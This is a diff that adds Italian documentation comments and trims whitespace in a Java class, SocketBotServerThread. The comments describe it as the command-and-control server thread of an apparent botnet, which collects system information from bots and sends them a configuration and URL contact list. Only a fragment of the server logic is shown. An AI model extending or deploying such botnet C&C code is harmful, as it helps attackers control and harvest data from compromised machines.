@@ -12,6 +12,10 @@ import control.ConfigHeader;
 import model.SystemInfoEntry;
 import model.URLEntry;
 
+/**
+ * Thread presente sul server C&C che resta in ascolto in attesa di richieste
+ * da parte dei bot.
+ */
 public class SocketBotServerThread extends Thread{
 
 	ProgramLog programLog;
@@ -24,7 +28,12 @@ public class SocketBotServerThread extends Thread{
 	ArrayList<URLEntry> outContactList;
 	ArrayList<SystemInfoEntry> inSystemInfo;
 	
-	
+	/**
+	 * Il metodo run() contiene un ciclo senza fine nel quale
+	 * per ogni richiesta di connessione da parte di un bot riceve
+	 * da quest'ultimo le informazioni di sistema e a sua volta invia
+	 * il file di configurazione
+	 */
 	@SuppressWarnings("unchecked")
 	@Override
 	public void run() {
@@ -55,7 +64,6 @@ public class SocketBotServerThread extends Thread{
 
 	            outContactList = Main.botServer.getContactList();
 	            outToClient.writeObject(outContactList);
-	            
 				
 			} catch (SocketException e) {
 				programLog.addWarning(e.getMessage());
@@ -63,16 +71,14 @@ public class SocketBotServerThread extends Thread{
 			} catch (IOException | ClassNotFoundException e) {
 				e.printStackTrace();
 			} 
-
-			
 		}
-		
-		
 	}
 	
+	/**
+	 * Chiusura della connessione nel momento in cui il thread viene interrotto
+	 */
 	@Override
 	public void interrupt() {
-		
 		  try {
 			    if(outToClient!=null)
 			    	outToClient.close();
@@ -89,9 +95,5 @@ public class SocketBotServerThread extends Thread{
 				}
 			  }
 		super.interrupt();
-		
 	}
-	
-	
-	
 }
